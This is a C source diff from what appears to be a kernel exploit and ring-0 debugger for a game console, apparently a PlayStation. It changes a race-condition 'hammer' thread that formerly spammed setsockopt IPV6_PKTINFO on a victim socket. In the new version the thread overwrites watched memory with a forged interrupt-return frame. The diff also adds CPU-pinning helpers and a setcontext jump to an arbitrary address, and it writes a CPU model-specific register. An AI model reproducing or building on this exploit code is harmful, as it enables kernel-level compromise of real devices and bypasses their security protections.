@@ -155,10 +155,65 @@ static const void* memmem(const void* a, size_t sz1, const void* b, size_t sz2)
     return 0;
 }
 
-static void* hammer_thread(void* arg)
+static void bind_to_all_available_cpus(void)
 {
+    for(int i = 0; i < 128; i++)
+    {
+        uint8_t affinity[16] = {0};
+        cpuset_getaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
+        affinity[i / 8] |= 1 << (i % 8);
+        cpuset_setaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
+    }
+}
+
+static int bind_to_some_cpu(int skip)
+{
+    uint8_t affinity[16] = {0};
+    cpuset_getaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
+    int i = 0;
+    while(i < 16 && !affinity[i])
+        i++;
+    for(int j = 0; j < skip; j++)
+    {
+        affinity[i] &= ~(affinity[i] ^ (affinity[i] - 1));
+        while(i < 16 && !affinity[i])
+            i++;
+    }
+    if(i == 16)
+        return -1;
+    affinity[i] &= (affinity[i] ^ (affinity[i] - 1));
+    i++;
+    while(i < 16)
+        affinity[i++] = 0;
+    return cpuset_setaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
+}
+
+__attribute__((optimize(3)))
+static void* hammer_thread(uint64_t* arg)
+{
+    if(bind_to_some_cpu(3))
+        kill(getpid(), SIGKILL);
+    volatile uint64_t* target = (volatile uint64_t*)arg[0];
+    uint64_t stack = arg[1];
     for(;;)
-        setsockopt(victim_fd, IPPROTO_IPV6, IPV6_PKTINFO, arg, 20);
+    {
+        if(target[0] == 0x20)
+        {
+            ((volatile uint32_t*)target)[-1] = 16;
+            target[0] = 0x43;
+            target[1] = 0x202;
+            target[2] = stack;
+            target[3] = 0x3b;
+        }
+    }
+}
+
+static void jmp_setcontext(uint64_t pc)
+{
+    uint64_t data[0x4c0/8];
+    getcontext((void*)data);
+    data[0xe0/8] = pc;
+    setcontext((void*)data);
 }
 
 static int* cpuid(int which, int* out)
@@ -199,20 +254,6 @@ uint64_t iret;
 
 extern char _start[];
 extern char _end[];
-
-static int bind_to_some_cpu(void)
-{
-    uint8_t affinity[16] = {0};
-    cpuset_getaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
-    int i = 0;
-    while(i < 16 && !affinity[i])
-        i++;
-    affinity[i] &= (affinity[i] ^ (affinity[i] - 1));
-    i++;
-    while(i < 16)
-        affinity[i++] = 0;
-    return cpuset_setaffinity(3, 1, *((int*(*)())dlsym((void*)0x2001, "pthread_self"))(), 16, (void*)affinity);
-}
 
 void r0gdb_setup(int do_swapgs)
 {
@@ -431,7 +472,7 @@ void r0gdb_trace(size_t trace_size)
     if(!tracing)
     {
         r0gdb_setup(0);
-        bind_to_some_cpu();
+        bind_to_some_cpu(0);
         r0gdb_wrmsr(0xc0000084, r0gdb_rdmsr(0xc0000084) & -0x101);
         char* stack = mmap(0, 16384, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
         mlock(stack, 16384);
@@ -1394,7 +1435,7 @@ static void trace_cryptasync(uint64_t* regs)
 
 static uint64_t other_thread;
 
-static void* other_thread_fn(void*)
+static void* other_thread_fn(void* arg)
 {
     other_thread = get_thread();
     //((int(*)())dlsym((void*)0x2001, "sceKernelSleep"))(10000000);
